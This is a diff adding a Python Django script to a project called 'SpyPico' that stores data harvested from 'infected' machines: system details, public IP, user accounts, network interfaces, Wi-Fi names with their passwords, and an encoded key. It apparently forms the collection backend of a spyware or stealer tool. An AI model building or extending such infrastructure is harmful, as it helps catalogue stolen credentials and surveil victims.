@@ -1,0 +1,55 @@
+import os
+import django
+
+
+
+os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'SpyPico.settings')
+django.setup()
+
+from backend.models import Maquina, Usuario, Red, Wifi, Password
+
+def insert_into_db(datos):
+    datos_maquina = datos.get("Maquina", {})
+
+    insert_Maquina = Maquina.objects.create(
+        nombre="Pedrito Pc",  # Cambiar por identificador real si lo tienes
+        sistema_operativo=datos_maquina.get("OS Name"),
+        version_sistema=datos_maquina.get("OS Version"),
+        fabricante=datos_maquina.get("System Manufacturer"),
+        modelo=datos_maquina.get("System Model"),
+        ip_publica=datos.get("IP_Publica"),
+        dominio=datos_maquina.get("Domain"),
+        tiempo_de_infeccion_fecha=datos_maquina.get("Fecha_Infeccion", None),
+        tiempo_de_infeccion_hora=datos_maquina.get("Hora_Infeccion", None),
+    )
+
+    # Insertar usuarios
+    datos_usuario = datos.get("Usuarios", {})
+    for nombre, estado in datos_usuario.items():
+        Usuario.objects.create(
+            maquina=insert_Maquina,
+            nombre=nombre,
+            estado=estado
+        )
+
+    # Insertar redes
+    for red in datos.get("Redes", []):
+        Red.objects.create(
+            maquina=insert_Maquina,
+            interfaz=red.get('Interfaz'),
+            ip=red.get('IP')
+        )
+
+    # Insertar redes WiFi
+    for wifi in datos.get("Redes_WiFi", []):
+        Wifi.objects.create(
+            maquina=insert_Maquina,
+            ssid=wifi.get('SSID'),
+            clave=wifi.get('Clave')
+        )
+
+    # Insertar clave cifrada
+    Password.objects.create(
+        maquina=insert_Maquina,
+        clave_base64=datos.get("Clave_Base64")
+    )
